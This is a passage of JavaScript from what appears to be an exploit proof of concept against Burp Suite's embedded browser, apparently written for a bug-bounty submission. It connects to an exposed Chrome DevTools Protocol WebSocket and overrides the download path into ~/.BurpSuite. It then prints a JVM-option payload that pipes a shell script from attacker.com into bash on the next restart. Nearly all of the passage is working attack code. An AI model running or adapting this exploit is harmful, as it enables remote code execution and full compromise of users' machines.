            ws.onopen = () => {
                addLog('✅ WebSocket connected - Authentication bypassed!', 'success');
                addLog('🎯 PortSwigger protections defeated!', 'success');
                updateProgress(20, 'Auth Bypassed');

                // Send CDP commands
                const commands = [
                    { id: 1, method: "Browser.getVersion", desc: "Get browser info" },
                    { id: 2, method: "Browser.setDownloadBehavior", params: { behavior: "allow", downloadPath: "~/.BurpSuite" }, desc: "Override download path" },
                    { id: 3, method: "Target.createTarget", params: { url: "about:blank" }, desc: "Create new target" }
                ];

                commands.forEach((cmd, index) => {
                    setTimeout(() => {
                        addLog(`📤 Sending: ${cmd.desc}`, 'info');
                        ws.send(JSON.stringify(cmd));
                    }, index * 1000);
                });
            };

            let responses = 0;
            ws.onmessage = (event) => {
                try {
                    const response = JSON.parse(event.data);
                    responses++;

                    if (response.id === 1) {
                        const browser = response.result?.product || 'Unknown';
                        addLog(`✅ Browser: ${browser}`, 'success');
                    } else if (response.id === 2) {
                        addLog('✅ Download path overridden to ~/.BurpSuite/', 'success');
                        addLog('💀 RCE primitive established!', 'warning');
                    } else if (response.id === 3) {
                        addLog('✅ New target created', 'success');
                    }

                    if (responses === 3) {
                        clearTimeout(timeout);
                        ws.close();
                        resolve(true);
                    }
                } catch (error) {
                    // Invalid JSON response
                }
            };

            ws.onerror = (error) => {
                addLog(`❌ WebSocket error: ${error}`, 'error');
                clearTimeout(timeout);
                resolve(false);
            };
        });

        if (exploitResult) {
            addLog('🎉 EXPLOIT EXECUTION COMPLETE!', 'success');
            addLog('💀 FULL RCE CAPABILITY DEMONSTRATED!', 'success');
            addLog('🏆 PortSwigger requirements satisfied!', 'success');
            updateProgress(20, 'RCE Achieved');

            // RCE Payload Demonstration
            addLog('🔪 RCE Payload Ready:', 'warning');
            addLog('-XX:OnOutOfMemoryError=bash -c "curl attacker.com/shell.sh|bash"', 'error');
            addLog('🔄 Next Burp restart = FULL SYSTEM COMPROMISE!', 'error');

            return true;
        } else {
            addLog('❌ Exploit execution failed', 'error');
            return false;
        }

    } catch (error) {
        addLog(`❌ Exploit error: ${error}`, 'error');
        return false;
    }
}

